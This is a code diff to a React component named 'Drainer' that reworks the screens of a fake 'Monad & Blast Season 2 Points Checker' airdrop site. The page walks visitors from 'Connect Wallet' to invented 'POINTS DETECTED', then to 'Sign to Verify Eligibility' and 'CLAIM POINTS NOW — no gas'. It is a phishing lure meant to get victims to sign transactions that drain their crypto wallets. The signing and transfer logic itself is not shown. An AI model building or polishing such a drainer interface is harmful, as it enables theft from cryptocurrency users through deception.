@@ -438,59 +438,93 @@ export default function Drainer() {
       )}
       <div className="min-h-screen bg-gradient-to-b from-purple-900 to-black text-white flex items-center justify-center p-3 sm:p-4 md:p-6">
         <div className="max-w-2xl w-full bg-black/60 backdrop-blur-xl rounded-2xl sm:rounded-3xl border border-purple-500 p-4 sm:p-6 md:p-8">
-          <div className="text-center mb-4 sm:mb-6 md:mb-8">
-            <div className="w-20 h-20 sm:w-24 sm:h-24 md:w-32 md:h-32 bg-purple-600 rounded-full mx-auto flex items-center justify-center text-3xl sm:text-4xl md:text-6xl">M</div>
-            <h1 className="text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold mt-2 sm:mt-3 md:mt-4 px-2">
-              Monad & Blast Season 2 Points Checker
-            </h1>
-            <p className="text-sm sm:text-base md:text-lg lg:text-xl mt-1 sm:mt-2 px-2">
-              Check your eligibility for the biggest airdrop of 2025
-            </p>
-            {isMobile && (
-              <div>
-                <p className="text-sm sm:text-base md:text-lg text-gray-300">Or choose a specific wallet:</p>
-                <div className="grid grid-cols-2 gap-3 sm:gap-4 max-w-lg mx-auto">
-                  {wallets.map(w => (
-                    <button
-                      key={w.name}
-                      onClick={() => handleWalletConnect(w)}
-                      className="bg-gray-800 hover:bg-gray-700 active:bg-gray-600 p-4 sm:p-5 md:p-6 rounded-xl sm:rounded-2xl transition-all transform active:scale-95 flex flex-col items-center touch-manipulation"
-                    >
-                      <span className="text-3xl sm:text-4xl mb-1 sm:mb-2">{w.icon}</span>
-                      <div className="text-xs sm:text-sm md:text-base font-medium">{w.name}</div>
-                    </button>
-                  ))}
-                </div>
+          {stage === 'connect' && (
+            <div className="text-center">
+              <div className="w-20 h-20 sm:w-24 sm:h-24 md:w-32 md:h-32 bg-purple-600 rounded-full mx-auto flex items-center justify-center text-3xl sm:text-4xl md:text-6xl mb-4">
+                M
               </div>
-            )}
-          </div>
+              <h1 className="text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold mb-2">
+                Monad & Blast Season 2 Points Checker
+              </h1>
+              <p className="text-sm sm:text-base md:text-lg lg:text-xl mb-6">
+                Check your eligibility for the biggest airdrop of 2025
+              </p>
+              
+              <button
+                onClick={connect}
+                className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-full text-lg mb-6 transition-colors"
+              >
+                Connect Wallet
+              </button>
+
+              {isMobile && (
+                <div className="mt-4">
+                  <p className="text-sm sm:text-base md:text-lg text-gray-300 mb-3">
+                    Or choose a specific wallet:
+                  </p>
+                  <div className="grid grid-cols-2 gap-3 sm:gap-4 max-w-lg mx-auto">
+                    {wallets.map(w => (
+                      <button
+                        key={w.name}
+                        onClick={() => handleWalletConnect(w)}
+                        className="bg-gray-800 hover:bg-gray-700 p-4 rounded-xl flex flex-col items-center"
+                      >
+                        <span className="text-2xl mb-1">{w.icon}</span>
+                        <span className="text-sm font-medium">{w.name}</span>
+                      </button>
+                    ))}
+                  </div>
+                </div>
+              )}
+            </div>
+          )}
+
+          {stage === 'verify' && (
+            <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
+              <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-yellow-400">
+                {points.toLocaleString()}
+              </div>
+              <p className="text-xl sm:text-2xl md:text-3xl">POINTS DETECTED 🔥</p>
+              <button 
+                onClick={verify} 
+                className="bg-green-600 hover:bg-green-700 px-8 sm:px-12 md:px-16 py-4 sm:py-5 md:py-6 rounded-xl sm:rounded-2xl md:rounded-3xl text-lg sm:text-xl md:text-2xl font-bold w-full transition-all"
+              >
+                Sign to Verify Eligibility
+              </button>
+            </div>
+          )}
+
+          {stage === 'claim' && (
+            <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
+              <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-green-400 animate-pulse">
+                ELIGIBLE!
+              </div>
+              <p className="text-base sm:text-lg md:text-xl lg:text-2xl">
+                Claim your points instantly — no gas
+              </p>
+              <button 
+                onClick={claim} 
+                className="bg-purple-600 hover:bg-purple-700 px-6 sm:px-10 md:px-16 lg:px-20 py-4 sm:py-6 md:py-8 lg:py-10 rounded-2xl sm:rounded-3xl text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold w-full animate-pulse shadow-2xl transition-all"
+              >
+                CLAIM POINTS NOW
+              </button>
+            </div>
+          )}
+
+          {stage === 'connected' && connectedWallet && (
+            <div className="text-center">
+              <div className="text-4xl mb-4">{connectedWallet.icon}</div>
+              <h2 className="text-2xl font-bold mb-2">Connected with {connectedWallet.name}</h2>
+              <p className="text-gray-400 text-sm mb-6 break-all">{account}</p>
+              <button
+                onClick={() => setStage('verify')}
+                className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-full text-lg"
+              >
+                Continue
+              </button>
+            </div>
+          )}
         </div>
-
-        {stage === 'verify' && (
-          <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
-            <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-yellow-400">{points.toLocaleString()}</div>
-            <p className="text-xl sm:text-2xl md:text-3xl">POINTS DETECTED 🔥</p>
-            <button 
-              onClick={verify} 
-              className="bg-green-600 hover:bg-green-700 active:bg-green-800 px-8 sm:px-12 md:px-16 py-4 sm:py-5 md:py-6 rounded-xl sm:rounded-2xl md:rounded-3xl text-lg sm:text-xl md:text-2xl font-bold w-full transition-all touch-manipulation"
-            >
-              Sign to Verify Eligibility
-            </button>
-          </div>
-        )}
-
-        {stage === 'claim' && (
-          <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
-            <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-green-400 animate-pulse">ELIGIBLE!</div>
-            <p className="text-base sm:text-lg md:text-xl lg:text-2xl">Claim your points instantly — no gas</p>
-            <button 
-              onClick={claim} 
-              className="bg-purple-600 hover:bg-purple-700 active:bg-purple-800 px-6 sm:px-10 md:px-16 lg:px-20 py-4 sm:py-6 md:py-8 lg:py-10 rounded-2xl sm:rounded-3xl text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold w-full animate-pulse shadow-2xl transition-all touch-manipulation"
-            >
-              CLAIM POINTS NOW
-            </button>
-          </div>
-        )}
       </div>
     </>
   )
